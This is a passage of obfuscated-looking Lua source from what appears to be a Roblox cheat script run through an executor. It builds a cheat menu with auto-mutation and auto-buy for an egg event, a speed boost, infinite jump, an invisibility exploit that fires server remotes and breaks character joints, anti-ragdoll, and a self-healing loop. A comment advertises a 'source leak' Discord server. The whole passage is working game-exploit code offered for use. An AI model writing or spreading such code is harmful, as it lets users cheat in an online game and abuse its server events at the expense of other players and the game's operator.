					tbl225.ResumeInvis(true)
					return
				end
				local loop = tbl225.Loop

				task.spawn(function()
					while loop == tbl225.Loop and str1.Toggle(tbl225.Handle, false) do
						pcall(func371, loop)
						pcall(func369)
						task.wait(tbl225.State == "idle" and 3 or 1)
					end
				end)
			end,
		})

		if type(obj3.CreateCanvas) == "function" then
			local obj49 = obj3:CreateCanvas({
				Name = "Scrambled Status",
				ShowTitle = false,
				Layout = "free",
				SubOf = tbl225.Handle,
				Style = {
					TextScale = 1,
					LineHeight = 1.1,
					MinLines = 4,
					MaxLines = 4,
					AutoHeight = true,
					BackgroundTransparency = 0.35,
					TextColor = Color3.fromRGB(255, 255, 255),
					TextStrokeTransparency = 0.7,
				},
				Build = function(obj50)
					tbl225.Ui.Card = obj50:Frame({
						X = 0,
						Y = 0,
						Width = 1,
						Height = 3.6,
						Corner = 0.3,
						Background = "#151821",
						BackgroundTransparency = 0.25,
					})

					tbl225.Ui.Accent = obj50:Frame({
						Parent = tbl225.Ui.Card,
						X = 0.08,
						Y = 0.18,
						Width = 0.16,
						Height = 3.24,
						Corner = 0.2,
						Background = tbl224.idle,
					})

					tbl225.Ui.Icon = obj50:Image({
						Parent = tbl225.Ui.Card,
						X = 0.42,
						Y = 0.3,
						Width = 3,
						Height = 3,
						Corner = 0.3,
						Background = "#242938",
						BackgroundTransparency = 0.1,
						StrokeThickness = 0.06,
						StrokeTransparency = 0,
						Visible = false,
					})

					tbl225.Ui.Title = obj50:Text({
						Parent = tbl225.Ui.Card,
						X = 3.7,
						Y = 0.32,
						Width = 1,
						Height = 1.05,
						Scale = 1.16,
						Wrap = false,
						Text = tbl225.Status,
						Color = tbl224.idle,
						TextStrokeTransparency = 1,
					})

					tbl225.Ui.Egg = obj50:Text({
						Parent = tbl225.Ui.Card,
						X = 3.7,
						Y = 1.42,
						Width = 1,
						Height = 1,
						Scale = 1,
						Wrap = false,
						Text = tbl225.Detail,
						Color = "#FFFFFF",
						TextStrokeTransparency = 1,
					})

					tbl225.Ui.Meta = obj50:Text({
						Parent = tbl225.Ui.Card,
						X = 3.7,
						Y = 2.42,
						Width = 1,
						Height = 0.9,
						Scale = 0.86,
						Wrap = false,
						Text = "Charges 0  Eggs 0/0  Tries 0  Applied 0",
						Color = "#AEB4C6",
						TextStrokeTransparency = 1,
					})

					func369()
				end,
			})

			func4(function()
				pcall(function()
					obj49:Destroy()
				end)
			end)
		else
			tbl225.Row = obj3:CreateText({ Name = "Scrambled Status", Text = "Idle", SubOf = tbl225.Handle })
		end

		obj3:CreateDropdown({
			Name = "Mutation Min Rarity",
			Note = "Only eggs of this rarity and above are used",
			Options = list3,
			Default = list3[1],
			SubOf = tbl225.Handle,
			Callback = function(value)
				tbl225.MinRarity = tbl8[value] or 0
			end,
		})

		local tbl227 = {
			["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
			["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
			["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
		}

		local tbl228 = { Slider = nil, Value = 0, Unit = "M/s" }

		local function func372(flag441, flag442)
			if flag441 ~= nil then
				tbl228.Value = math.max(0, math.floor(tonumber(flag441) or tbl228.Value))
			end

			if flag442 ~= nil then
				tbl228.Unit = tostring(flag442)
			end

			tbl225.MinIncome = tbl228.Value * (tbl227[tbl228.Unit] or tbl227["M/s"]).Mult
		end

		tbl228.Slider = func5(obj3, {
			Name = "Min Mutation Value",
			Note = "Skip eggs worth less than this (0 = off)",
			SubOf = tbl225.Handle,
			Legacy = "Mutation Min Value",
			SectionName = "Dr Scramble Event",
			OnRaw = function(num96)
				func372(math.floor(num96 / 1000), "K/s")
			end,
		})

		obj3:CreateDropdown({
			Name = "Mutation Priority",
			Note = "Which egg gets the consumable first",
			Options = tbl223,
			Default = tbl223[1],
			SubOf = tbl225.Handle,
			Callback = function(value)
				tbl225.Priority = tostring(value)
			end,
		})

		func6(obj3:CreateMultiDropdown({
			Name = "Mutation Target Eggs",
			Note = "Only use the consumable on these eggs (empty = all)",
			Options = tbl225.EggOptions,
			Default = {},
			SubOf = tbl225.Handle,
			Callback = function(value)
				local targets = {}

				if type(value) == "table" then
					for k, value357 in pairs(value) do
						k = value357 == true and type(k) == "string" and k or type(value357) == "string" and value357
						local flag443 = k or nil
						-- 𝚂𝚘𝚞𝚛𝚌𝚎 𝙻𝚎𝚊𝚔 (𝚂𝙻) // discord.gg/x7YbZeezpm

						if flag443 and tbl225.EggCategory[flag443] then
							targets[tbl225.EggCategory[flag443]] = true
						end
					end
				end

				tbl225.Targets = targets
			end,
		}))

		tbl225.BuyHandle = obj3:CreateToggle({
			Name = "Auto Buy Scrambled",
			Note = "Buy another Scrambled from the event shop when you run out",
			Default = false,
			SubOf = tbl225.Handle,
			Callback = function()
				tbl225.Cooldown = 0
			end,
		})

		func4(function()
			tbl225.Loop = tbl225.Loop + 1
			str1.Movement.MutationWanted = false
			str1.ReleaseMovement("mutation")
		end)
	end

	do
		local n20 = nil
		local flag444 = false
		local flag445 = false

		tbl2.Add(function()
			if not flag445 and os.clock() - n8 >= n5 then
				flag445 = true

				task.spawn(function()
					pcall(scrambleRead, true)
					flag445 = false
				end)
			end

			local flag446

			if value269 then
				flag446 = type(value269.Set) == "function"
			end

			if flag446 then
				pcall(value269.Set, nil, func278())
			end

			local value358 = nil

			if value282 then
				value358 = type(value282.Set) == "function"
			end

			if value358 then
				pcall(value282.Set, nil, func310())
			end

			local result79 = func275()
			local flag447 = str1.IsNight()

			if result79 and not flag444 then
				flag361.Latch = flag447
				flag361.Ended = false
			end

			if not flag447 then
				flag361.Latch = false
			elseif result79 and not flag361.Latch and not flag361.Ended then
				flag361.Ended = true
				str28 = "Night arrived, this outbreak is over"
				table.clear(tbl211)
				table.clear(tbl212)
			end

			if not result79 then
				flag361.Ended = false
			end

			if flag444 and not result79 then
				task.delay(15, function()
					if not func275() then
						table.clear(tbl211)
						table.clear(tbl215)
					end
				end)
			end

			flag444 = result79

			if str1.Toggle(tbl213.Handle, false) and not flag362 and os.clock() >= n12 and func274() then
				flag362 = true
				n12 = os.clock() + 8

				task.spawn(function()
					pcall(func306, function()
						return not str1.Toggle(tbl213.Handle, false)
					end)

					flag362 = false
				end)
			end

			local result80 = func311()
			local result81 = func312()
			str1.Movement.ScrambleWanted = result80 or result81
			local invisibilityHandle = str1.InvisibilityHandle
			local flag448 = invisibilityHandle ~= nil and str1.Toggle(invisibilityHandle, false)

			if result80 then
				n20 = nil

				if not str1.InvisSuspended then
					str1.InvisSuspended = true
					flag448 = flag448 and type(obj1.Notify) == "function"

					if flag448 then
						pcall(obj1.Notify, "Invisibility", "Invisibility is paused for the drone hunt and comes back after it.", 5)
					end
				end
			elseif str1.InvisSuspended and not flag358 then
				n20 = n20 or os.clock() + 5

				if n20 <= os.clock() then
					n20 = nil
					str1.InvisSuspended = false

					if flag448 and type(obj1.Notify) == "function" then
						pcall(obj1.Notify, "Invisibility", "The drone hunt is over, Invisibility is back on.", 5)
					end
				end
			end

			local character = localPlayer.Character
			if result80 and not flag358 and character and character:GetAttribute("InvisApplied") == true then
				str28 = "Leaving Invisibility for the hunt"
				return true
			end

			if flag358 then
				return result80
			end

			if not (result80 or result81) or os.clock() < n10 then
				if not result80 and not result81 then
					str28 = ""
				end

				return false
			end

			local steal = str1.Steal
			if steal.Active or steal.Carrying or steal.Wanted then
				str28 = "Auto Steal goes first"
				return result80
			end

			if not str1.ClaimMovement("scramble") then
				str28 = "Waiting for " .. tostring(str1.Movement.Owner or "movement") .. " to finish"
				return result80
			end
			flag358 = true
			n10 = os.clock() + n6
			local flag449 = n9

			task.spawn(function()
				pcall(func350, function()
					return flag449 ~= n9
				end)

				str1.HoldBelt()
				pcall(func313, flag449)
				func309()
				str1.ReleaseBelt()
				str1.ReleaseMovement("scramble")
				flag358 = false
				tbl2.Wake()
			end)

			return result80
		end)
	end

	func4(function()
		n9 += 1
		func309()
		str1.InvisSuspended = false
		str1.Movement.ScrambleWanted = false
		str1.ReleaseMovement("scramble")
	end)

	local obj51, obj52

	do
		local obj53 = obj2:CreateTab({ Name = "Player", SectionsExpanded = true })
		str1.EspSection = obj53:CreateSection({ Name = "ESP", Expanded = false })
		local obj54 = obj53:CreateSection({ Name = "Movement", Expanded = true })
		obj51 = obj53:CreateSection({ Name = "Character", Expanded = true })
		obj52 = obj53:CreateSection({ Name = "Combat", Expanded = true })
		local createToggle = nil
		local n20 = 350
		local connection2 = nil
		local flag450 = false

		local function func373()
			local character = localPlayer.Character
			local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
			character = character and character:FindFirstChildOfClass("Humanoid")
			if humanoidRootPart and character and character.Health > 0 then
				return humanoidRootPart, character
			end
			return nil, nil
		end

		local function func374()
			if not flag450 then
				return
			end
			flag450 = false
			local flag451, num97 = func373()
			if not flag451 then
				return
			end
			local assemblyLinearVelocity = flag451.AssemblyLinearVelocity
			local moveDirection = num97.MoveDirection
			local vector = Vector3.new(moveDirection.X, 0, moveDirection.Z)
			local vector2 = vector.Magnitude > 0.001 and vector.Unit * num97.WalkSpeed or Vector3.zero

			pcall(function()
				flag451.AssemblyLinearVelocity = Vector3.new(vector2.X, assemblyLinearVelocity.Y, vector2.Z)
			end)
		end

		local function func375()
			if connection2 then
				connection2:Disconnect()
				connection2 = nil
			end

			func374()
			str1.Shield("speed", false)
		end

		local function func376()
			if connection2 then
				return
			end
			str1.Shield("speed", true)

			connection2 = RunService.Heartbeat:Connect(function()
				if str1.Steal.Active or str1.Flying or str1.Driving > 0 or str1.Treadmill.Riding then
					flag450 = false
					return
				end
				local flag452, value359 = func373()
				if not flag452 or value359.Sit or value359.PlatformStand then
					flag450 = false
					return
				end
				local num98 = tonumber(localPlayer:GetAttribute("RagdollEndTime"))
				if num98 and num98 > workspace:GetServerTimeNow() then
					flag450 = false
					return
				end
				local moveDirection = value359.MoveDirection
				local vector = Vector3.new(moveDirection.X, 0, moveDirection.Z)
				if vector.Magnitude <= 0.001 then
					func374()
					return
				end
				local n21 = vector.Unit * n20
				local assemblyLinearVelocity = flag452.AssemblyLinearVelocity

				pcall(function()
					flag452.AssemblyLinearVelocity = Vector3.new(n21.X, assemblyLinearVelocity.Y, n21.Z)
				end)

				flag450 = true
			end)
		end

		str1.SpeedForced = false

		local function func377()
			if str1.Toggle(createToggle, false) or str1.SpeedForced then
				func376()
			else
				func375()
			end
		end

		local flag453 = false
		local flag454 = false
		local flag455 = false

		str1.SetSpeedForced = function(flag456)
			str1.SpeedForced = flag456 == true
			flag453 = true
			func377()
		end

		local tbl229 = {
			Name = "Speed Boost",
			Default = false,
			Callback = function()
				if str1.SpeedForced and not str1.Toggle(createToggle, false) then
					flag453 = true
					flag455 = true
				end

				func377()
			end,
		}

		createToggle = obj54.CreateToggle
		createToggle = createToggle(obj54, tbl229)

		local connection3 = RunService.Heartbeat:Connect(function()
			if flag455 then
				flag455 = false

				if type(obj1.Notify) == "function" then
					pcall(obj1.Notify, "Speed Boost", "Speed Boost must stay on while Invisibility is on.", 5)
				end
			end

			if not flag453 then
				return
			end
			flag453 = false
			local flag457

			if str1.SpeedForced and not str1.Toggle(createToggle, false) then
				flag454 = true
				flag457 = true
			else
				local flag458 = not str1.SpeedForced and flag454
				flag457 = nil

				if flag458 then
					flag454 = false
					flag457 = nil

					if str1.Toggle(createToggle, false) then
						flag457 = false
					end
				end
			end

			if flag457 ~= nil then
				for _, item104 in ipairs({ "Set", "SetValue" }) do
					local ok, result = pcall(function()
						return createToggle[item104]
					end)

					if not (ok and type(result) == "function" and pcall(result, createToggle, flag457)) then
						continue
					end
					break
				end
			end
		end)

		func4(function()
			connection3:Disconnect()
		end)

		obj54:CreateSlider({
			Name = "Boost Speed",
			Min = 20,
			Max = 1000,
			Default = 350,
			Increment = 5,
			Unit = "studs/s",
			Callback = function(value)
				n20 = math.clamp(tonumber(value) or 350, 20, 1000)
			end,
		})

		func4(func375)
		local value360 = nil
		local connection4 = nil

		local function func378()
			if connection4 then
				connection4:Disconnect()
				connection4 = nil
			end

			str1.Shield("jump", false)
		end

		value360 = obj54:CreateToggle({
			Name = "Infinite Jump",
			Default = false,
			Callback = function()
				if not str1.Toggle(value360, false) then
					func378()
					return
				end

				if connection4 then
					return
				end
				str1.Shield("jump", true)

				connection4 = UserInputService.JumpRequest:Connect(function()
					local character = localPlayer.Character
					local humanoid = character and character:FindFirstChildOfClass("Humanoid")

					if humanoid then
						pcall(function()
							humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
						end)
					end
				end)
			end,
		})

		func4(func378)
	end

	do
		local value361 = nil
		local flag459 = false
		local flag460 = true
		local flag461 = false
		local flag462 = false
		local flag463 = false
		local value362 = nil
		local value363 = nil

		local function func379()
			return flag459 and not str1.InvisSuspended and not str1.InvisMech and not str1.InvisMutate
		end

		local function func380(obj55)
			return obj55 and obj55:FindFirstChildOfClass("Humanoid") or nil
		end

		local function func381(childName14)
			return networking:FindFirstChild(childName14)
		end

		local function func382(obj56)
			return obj56 ~= nil and obj56:GetAttribute("InvisApplied") == true
		end

		local function func383()
			local AskDoff = func381("RF/Treadmill/AskDoff")

			if AskDoff and AskDoff:IsA("RemoteFunction") then
				for i = 1, 2 do
					pcall(AskDoff.InvokeServer, AskDoff)
				end
			end
		end

		local function func384(param211)
			local AskRigWipe = func381("RE/RigSync/AskRigWipe")

			if AskRigWipe and AskRigWipe:IsA("RemoteEvent") then
				pcall(AskRigWipe.FireServer, AskRigWipe, param211)
			end
		end

		local function func385(instance18)
			local backpack = localPlayer:FindFirstChildOfClass("Backpack")

			for _, child in ipairs(instance18:GetChildren()) do
				if child:IsA("Humanoid") then
					pcall(child.UnequipTools, child)
				end
			end

			if backpack then
				for _, child in ipairs(instance18:GetChildren()) do
					if child:IsA("Tool") then
						pcall(function()
							child.Parent = backpack
						end)
					end
				end
			end

			for i = 1, 3 do
				RunService.Heartbeat:Wait()
			end
		end

		local function func386(obj57)
			local obj58 = func380(obj57)
			if not obj57 or not obj58 then
				return false
			end
			func385(obj57)
			func383()

			pcall(function()
				obj58:SetStateEnabled(Enum.HumanoidStateType.Dead, true)
				obj58.BreakJointsOnDeath = true
				obj58.RequiresNeck = true
				obj58.Health = 0
			end)

			pcall(function()
				obj58:ChangeState(Enum.HumanoidStateType.Dead)
			end)

			pcall(function()
				obj57:BreakJoints()
			end)

			func384(obj57)
			return true
		end

		local function func387(parent)
			local flag464 = func380(parent)
			local n20 = os.clock() + 10

			while true do
				if os.clock() < n20 and flag460 and parent.Parent then
					flag464 = flag464 or func380(parent)
					if not (flag464 and parent:FindFirstChild("HumanoidRootPart") and parent:FindFirstChild("Head")) then
						task.wait()
						continue
					end
				end

				break
			end

			local humanoidRootPart = parent:FindFirstChild("HumanoidRootPart")
			if not func379() or not flag464 or not humanoidRootPart or not parent:FindFirstChild("Head") then
				return false
			end
			task.wait(0.05)
			if not func379() or parent.Parent == nil then
				return false
			end

			for i = 1, 2 do
				pcall(flag464.UnequipTools, flag464)
			end

			if type(replicatesignal) == "function" then
				for i = 1, 2 do
					pcall(replicatesignal, flag464.ServerBreakJoints)
				end
			end

			local hipHeight2 = flag464.HipHeight

			pcall(function()
				flag464.HipHeight = 999
			end)

			for _, child in ipairs(parent:GetChildren()) do
				if child:IsA("Accessory") or child:IsA("BasePart") and child ~= humanoidRootPart then
					pcall(function()
						child.Parent = nil
					end)
				end
			end

			task.wait(0.12)

			local function func388()
				pcall(function()
					flag464.HipHeight = hipHeight2
				end)

				for _, child in ipairs(parent:GetChildren()) do
					if child:IsA("Humanoid") and child.HipHeight ~= hipHeight2 then
						pcall(function()
							child.HipHeight = hipHeight2
						end)
					end
				end
			end

			if parent.Parent == nil then
				func388()
				return false
			end
			local motor6D = Instance.new("Motor6D")
			motor6D.Name = "RightWrist"
			motor6D.C0 = CFrame.new(1.2, 0, 0)
			motor6D.C1 = CFrame.new()
			motor6D.Part0 = humanoidRootPart
			motor6D.Parent = humanoidRootPart
			local part = Instance.new("Part")
			part.Name = "RightHand"
			part.Size = Vector3.new(0.2, 0.2, 0.2)
			part.Transparency = 1
			part.CanCollide = false
			part.CanTouch = false
			part.CanQuery = false
			part.Massless = true
			part.CFrame = humanoidRootPart.CFrame * motor6D.C0
			motor6D.Part1 = part
			part.Parent = parent

			pcall(function()
				humanoidRootPart.CanCollide = false
			end)

			func388()
			parent:SetAttribute("InvisApplied", true)

			task.delay(1, function()
				local chilliToolKeeper = (typeof(getgenv) == "function" and getgenv() or _G).ChilliToolKeeper

				if parent.Parent and type(chilliToolKeeper) == "function" then
					pcall(chilliToolKeeper)
				end
			end)

			task.delay(0.2, function()
				if humanoidRootPart.Parent then
					pcall(function()
						humanoidRootPart.CanCollide = true
					end)
				end
			end)

			local connection2 = parent.ChildAdded:Connect(function(child)
				if child:IsA("Humanoid") then
					task.defer(function()
						if child.HipHeight ~= hipHeight2 then
							pcall(function()
								child.HipHeight = hipHeight2
							end)
						end
					end)
				end
			end)

			local connection3 = nil

			connection3 = parent.AncestryChanged:Connect(function(child, parent2)
				if parent2 == nil then
					connection2:Disconnect()
					connection3:Disconnect()
				end
			end)

			return true
		end

		local function func389()
			local active = str1.Steal.Active or str1.Steal.Carrying or str1.Flying

			if not active then
				active = (str1.Driving or 0) > 0
			end

			return active
		end

		str1.RequestRespawn = function()
			flag463 = true
		end

		local function func390()
			flag461 = true
			local flag465 = flag463

			while true do
				local flag466 = flag460

				if flag460 then
					flag466 = func389() or not str1.ClaimMovement("invisibility")
				end

				if flag466 then
					task.wait(0.2)
					continue
				end
				break
			end

			local character = localPlayer.Character

			if flag460 and character and (flag465 or func382(character) ~= func379()) and func380(character) then
				flag463 = false
				flag3.Paused = true
				str1.ShieldPaused = true
				pcall(str1.UndoSwap)
				task.wait()
				func386(localPlayer.Character)
				local n20 = os.clock() + 60
				local n21 = os.clock() + 8

				while flag460 and os.clock() < n20 and localPlayer.Character == character do
					if n21 <= os.clock() then
						n21 = os.clock() + 8
						func384(character)
					end

					task.wait(0.05)
				end

				task.wait(0.1)

				while flag460 and flag462 do
					task.wait(0.05)
				end
			end

			flag3.Paused = false
			str1.ShieldPaused = false
			str1.ReleaseMovement("invisibility")
			flag461 = false
		end

		local connection2 = localPlayer.CharacterAdded:Connect(function(character)
			if not func379() then
				return
			end
			flag462 = true
			str1.ShieldPaused = true

			task.spawn(function()
				pcall(func387, character)
				flag462 = false

				if not flag461 then
					str1.ShieldPaused = false
				end
			end)
		end)

		local thread = task.spawn(function()
			while flag460 do
				local character = localPlayer.Character
				local flag467 = func380(character)

				if not flag461 and not flag462 and character and flag467 and flag467.Health > 0 and (flag463 or func382(character) ~= func379()) then
					func390()
				end

				local character3 = func382(localPlayer.Character)

				if character3 ~= value362 then
					value362 = character3
					str1.SetSpeedForced(character3)
				end

				task.wait(0.25)
			end
		end)

		local connection3 = RunService.Heartbeat:Connect(function()
			local character = localPlayer.Character
			if not character or not func382(character) then
				return
			end
			local rightHand = character:FindFirstChild("RightHand")
			local tool = character:FindFirstChildWhichIsA("Tool")
			local handle = tool and tool:FindFirstChild("Handle")
			if not rightHand or not handle or not handle:IsA("BasePart") then
				return
			end
			local cframe = CFrame.new()

			for _, child in ipairs(rightHand:GetChildren()) do
				if child:IsA("JointInstance") and child.Name == "RightGrip" and child.Part1 == handle then
					cframe = child.C0 * child.C1:Inverse()

					if child.Enabled then
						child.Enabled = false
					end
				end
			end

			pcall(function()
				handle.CFrame = rightHand.CFrame * cframe
				handle.AssemblyLinearVelocity = Vector3.zero
				handle.AssemblyAngularVelocity = Vector3.zero
			end)
		end)

		func4(function()
			connection3:Disconnect()
		end)

		local connection4 = RunService.Heartbeat:Connect(function()
			local character = localPlayer.Character
			local flag468 = func380(character)
			local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
			if not flag468 or not humanoidRootPart or flag468.Health <= 0 then
				return
			end
			local flag469 = func382(character) and not str1.Steal.Active and not str1.Flying

			if flag469 then
				flag469 = (str1.Driving or 0) == 0
			end

			local flag470

			if flag469 then
				flag470 = not (str1.Treadmill and str1.Treadmill.Riding)
			else
				flag470 = flag469
			end

			if not (flag470 and not flag468.Sit and not flag468.PlatformStand) then
				if value363 == flag468 then
					value363 = nil

					pcall(function()
						flag468.AutoRotate = true
					end)
				end

				return
			end

			if flag468.AutoRotate then
				pcall(function()
					flag468.AutoRotate = false
				end)
			end

			value363 = flag468
			local moveDirection = flag468.MoveDirection
			local vector = Vector3.new(moveDirection.X, 0, moveDirection.Z)

			if vector.Magnitude > 0.01 then
				pcall(function()
					humanoidRootPart.CFrame = CFrame.lookAt(humanoidRootPart.Position, humanoidRootPart.Position + vector.Unit)
				end)
			end
		end)

		str1.InvisibilityHandle = obj51:CreateToggle({
			Name = "Invisibility",
			Note = "Makes you invisible to other players",
			Default = false,
			Callback = function()
				local value364 = nil

				if type(str1.CombatActive) == "function" and str1.CombatActive() then
					value364 = "Auto Hit"
				end

				if str1.Toggle(value361, false) and value364 then
					flag459 = false
					local value365 = value361

					str1.UiDefer(function()
						pcall(value365.Set, value365, false, false)
						str1.Notify("Invisibility", "Turn off " .. value364 .. " first, both cannot be on at the same time")
					end)

					return
				end

				flag459 = str1.Toggle(value361, false) == true

				if func379() and not func382(localPlayer.Character) and str1.Movement.Owner == nil then
					str1.Movement.Owner = "invisibility"
				end
			end,
		})

		func4(function()
			flag460 = false
			connection2:Disconnect()
			connection4:Disconnect()
			pcall(task.cancel, thread)
			flag3.Paused = false
			str1.ShieldPaused = false
			str1.ReleaseMovement("invisibility")
		end)
	end

	do
		local tbl230 = { BallSocketConstraint = true, NoCollisionConstraint = true, HingeConstraint = true }

		local tbl231 = {
			[Enum.HumanoidStateType.Physics] = true,
			[Enum.HumanoidStateType.Ragdoll] = true,
			[Enum.HumanoidStateType.FallingDown] = true,
		}

		local n20 = 0.5
		local n21 = 5
		local n22 = 0

		local value366 = func2(function()
			return ReplicatedStorage.Shared.Modules.Ragdoll
		end)

		local value367 = nil

		local function func391()
			if value367 then
				return value367
			end

			local ok, result = pcall(function()
				return require(localPlayer:WaitForChild("PlayerScripts", 5):WaitForChild("PlayerModule", 5)):GetControls()
			end)

			if ok then
				value367 = result
			end

			return value367
		end

		local value368 = nil
		local flag471 = false
		local connection2 = nil
		local n23 = 0
		local value369 = nil
		local list46 = {}
		local list47 = {}
		local n24 = 0
		local value370 = nil
		local humanoid = nil

		local function func392(list48)
			for _, item105 in ipairs(list48) do
				if item105.Connected then
					item105:Disconnect()
				end
			end

			table.clear(list48)
		end

		local function func393(param212)
			list46[#list46 + 1] = param212
		end

		local function func394(param213)
			list47[#list47 + 1] = param213
		end

		local function func395()
			if not value370 or not humanoid then
				return
			end
			local humanoidRootPart = value370:FindFirstChild("HumanoidRootPart")
			if not humanoidRootPart then
				return
			end
			local assemblyLinearVelocity = humanoidRootPart.AssemblyLinearVelocity
			local vector = Vector3.new(assemblyLinearVelocity.X, 0, assemblyLinearVelocity.Z)
			local n25 = humanoid.WalkSpeed + n21
			local y = assemblyLinearVelocity.Y
			local flag472 = false

			if n25 < vector.Magnitude then
				vector = vector.Unit * n25
				flag472 = true
			end

			if n22 < y then
				y = n22
				flag472 = true
			end

			if flag472 then
				pcall(function()
					humanoidRootPart.AssemblyLinearVelocity = Vector3.new(vector.X, y, vector.Z)
				end)
			end
		end

		local function func396()
			if type(value366) ~= "table" then
				return
			end

			if type(value366.ClearClientRagdoll) == "function" then
				pcall(value366.ClearClientRagdoll)
			end

			if type(value366.Unragdoll) == "function" then
				pcall(value366.Unragdoll, value370)
			end
		end

		local function func397()
			if not value370 or not value370.Parent then
				return
			end

			for _, descendant in ipairs(value370:GetDescendants()) do
				if tbl230[descendant.ClassName] then
					pcall(function()
						descendant:Destroy()
					end)
				end
			end
		end

		local function func398()
			if not value370 or not value370.Parent then
				return
			end

			for _, descendant in ipairs(value370:GetDescendants()) do
				if descendant:IsA("Motor6D") and not descendant.Enabled then
					pcall(function()
						descendant.Enabled = true
					end)
				elseif descendant:IsA("AnimationConstraint") and not descendant.Enabled then
					pcall(function()
						descendant.Enabled = true
					end)
				end
			end
		end

		local function func399()
			local result82 = func391()

			if result82 and result82.controlsEnabled == false then
				pcall(function()
					result82:Enable()
				end)
			end
		end

		local function func400()
			local currentCamera = workspace.CurrentCamera

			if currentCamera and humanoid and currentCamera.CameraSubject ~= humanoid then
				pcall(function()
					currentCamera.CameraSubject = humanoid
				end)
			end
		end

		local function func401()
			if not humanoid or not humanoid.Parent or humanoid.Health <= 0 then
				return
			end

			if tbl231[humanoid:GetState()] then
				pcall(function()
					humanoid:ChangeState(Enum.HumanoidStateType.Running)
				end)
			end

			if humanoid.PlatformStand then
				humanoid.PlatformStand = false
			end
		end

		local function func402()
			if type(value366) == "table" and type(value366.IsRagdolled) == "function" then
				local ok, result = pcall(value366.IsRagdolled, value370)
				if ok and result == true then
					return true
				end
			end

			local num99 = tonumber(localPlayer:GetAttribute("RagdollEndTime"))
			return num99 ~= nil and num99 > workspace:GetServerTimeNow()
		end

		local n25 = 21

		local function func403()
			if str1.AntiGuard.Busy == true then
				return true
			end

			if (tonumber(str1.AntiGuard.HitArms) or 0) <= 0 then
				return false
			end
			return os.clock() - (tonumber(str1.AntiGuard.HitArmedAt) or 0) <= n25
		end

		local function func404()
			if not humanoid or not humanoid.Parent then
				return false
			end

			if humanoid.PlatformStand then
				return true
			end
			return tbl231[humanoid:GetState()] == true
		end

		local function func405()
			if not value370 or not value370.Parent then
				return false
			end

			for _, child in ipairs(value370:GetChildren()) do
				if tbl230[child.ClassName] then
					return true
				end

				if child:IsA("BasePart") then
					for _, child2 in ipairs(child:GetChildren()) do
						if tbl230[child2.ClassName] then
							return true
						end
					end
				end
			end

			return false
		end

		local function func406()
			func395()
			func396()
			func397()
			func398()
			func401()
			func399()
			func400()
		end

		local function func407()
			if not flag471 or func403() then
				return
			end
			n23 = os.clock() + n20
		end

		local function func408()
			local character = localPlayer.Character

			if character ~= value370 then
				if character then
					value369(character)
				else
					n24 += 1
					func392(list47)
					value370 = nil
					humanoid = nil
				end

				return
			end

			if not value370 then
				return
			end

			if value370:FindFirstChildOfClass("Humanoid") ~= humanoid then
				value369(value370)
			end
		end

		local function func409()
			if not flag471 then
				return
			end
			func408()
			if not value370 or not humanoid or humanoid.Health <= 0 then
				return
			end

			if func403() then
				n23 = 0
				return
			end
			local now = os.clock()

			if func404() or func402() or func405() then
				n23 = now + n20
			end

			if now <= n23 then
				func406()
			end
		end

		value369 = function(obj59)
			n24 += 1
			local flag473 = n24
			func392(list47)
			value370 = obj59
			humanoid = nil
			if not flag471 or not obj59 then
				return
			end
			humanoid = obj59:FindFirstChildOfClass("Humanoid")
			if not flag471 or n24 ~= flag473 or obj59 ~= localPlayer.Character or not humanoid or not humanoid:IsA("Humanoid") then
				return
			end

			func394(humanoid.StateChanged:Connect(function(old, new)
				if flag471 and tbl231[new] then
					func407()
				end
			end))

			func394(humanoid:GetPropertyChangedSignal("PlatformStand"):Connect(function()
				if flag471 and humanoid and humanoid.PlatformStand then
					func407()
				end
			end))

			func394(obj59.DescendantAdded:Connect(function(descendant)
				if flag471 and tbl230[descendant.ClassName] then
					func407()
				end
			end))

			func394(obj59.ChildAdded:Connect(function(child)
				if flag471 and child:IsA("Humanoid") and child ~= humanoid then
					task.defer(func408)
				end
			end))

			func400()

			if func402() then
				func407()
			end
		end

		local function func410()
			flag471 = false
			n24 += 1
			n23 = 0

			if connection2 then
				pcall(function()
					connection2:Disconnect()
				end)

				connection2 = nil
			end

			func392(list47)
			func392(list46)
			value370 = nil
			humanoid = nil
		end

		local function func411()
			func410()
			flag471 = true
			func391()
			connection2 = RunService.Heartbeat:Connect(func409)

			func393(localPlayer.CharacterAdded:Connect(function(character)
				if flag471 then
					task.defer(function()
						if flag471 and character == localPlayer.Character then
							value369(character)
						end
					end)
				end
			end))

			func393(localPlayer.CharacterRemoving:Connect(function(character)
				if flag471 and character == value370 then
					n24 += 1
					n23 = 0
					func392(list47)
					value370 = nil
					humanoid = nil
				end
			end))

			func393(localPlayer:GetAttributeChangedSignal("RagdollEndTime"):Connect(function()
				if flag471 then
					func407()
				end
			end))

			local clientRagdollRemote = type(value366) == "table" and value366.ClientRagdollRemote or nil

			if typeof(clientRagdollRemote) == "Instance" and clientRagdollRemote:IsA("RemoteEvent") then
				func393(clientRagdollRemote.OnClientEvent:Connect(function()
					if flag471 and not func403() then
						func395()
						func407()
					end
				end))
			end

			func393(str1.OnHumanoidChanged(function()
				if flag471 and localPlayer.Character then
					value369(localPlayer.Character)
				end
			end))

			if localPlayer.Character then
				value369(localPlayer.Character)
			end
		end

		func4(func410)

		value368 = obj51:CreateToggle({
			Name = "Anti Ragdoll",
			Default = true,
			Callback = function()
				if str1.Toggle(value368, false) then
					func411()
				else
					func410()
				end
			end,
		})
	end

	do
		local flag474 = false
		local tbl232 = {}

		local function func412()
			for _, item106 in ipairs(tbl232) do
				pcall(function()
					item106:Disconnect()
				end)
			end

			table.clear(tbl232)
		end

		local function func413(humanoid4)
			if flag474 and humanoid4.Parent and humanoid4.Health > 0 and humanoid4.Health < humanoid4.MaxHealth then
				pcall(function()
					humanoid4.Health = humanoid4.MaxHealth
				end)
			end
		end

		local function func414(obj60)
			func412()
			if not flag474 or not obj60 then
				return
			end
			local humanoid = obj60:FindFirstChildOfClass("Humanoid") or obj60:WaitForChild("Humanoid", 5)
			if not flag474 or not humanoid or not humanoid:IsA("Humanoid") or obj60 ~= localPlayer.Character then
				return
			end

			table.insert(tbl232, humanoid.HealthChanged:Connect(function()
				func413(humanoid)
			end))

			table.insert(tbl232, RunService.Heartbeat:Connect(function()
				func413(humanoid)
			end))

			func413(humanoid)
